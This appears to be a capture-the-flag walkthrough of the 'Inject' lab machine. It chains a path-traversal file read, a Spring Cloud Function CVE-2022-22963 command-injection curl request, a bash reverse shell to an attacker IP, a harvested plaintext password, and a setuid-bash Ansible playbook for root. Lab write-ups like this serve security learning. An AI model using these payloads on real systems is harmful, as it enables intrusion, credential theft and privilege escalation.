LFI in /show_image endpoint
![[Pasted image 20230312114245.png]]


```bash
$curl -i -s -k -X $'GET'     -H $'Host: 10.129.21.241:8080' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1'     $'http://10.129.21.241:8080/show_image?img=../../../../../../etc/passwd' | grep "/bin/bash\|/bin/sh"
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```
Only frank and phil are useful right now

```bash
#!/bin/bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.9/9001 0>&1"
```

Checking the pom.xml file we get:
```bash
$curl 'http://10.129.21.241:8080/show_image?img=../../../../../../var/www/WebApp/pom.xml'<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>

[TEXT]...
		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
			
[TEXT]...

```

Quick Google Search gives out the fact that this is vulnerable to https://sysdig.com/blog/cve-2022-22963-spring-cloud/ , and the command to exploit this vulnerability is:

```bash
curl -i -s -k -X $'POST' -H $'Host: <machine_ip>:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/test")' --data-binary $'exploit_poc' $'http://<machine_ip>:8080/functionRouter'
```

With that, we can verify that the machine actually creates the file, which shows that the machine is vulnerable to this CVE.


```xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

For user phil:DocPhillovestoInject123

playbook_1.yml
```yml
- hosts: localhost
  tasks:
    - name: Max Shell
      shell: cp /bin/bash /tmp/ape && chmod +s /tmp/ape
```
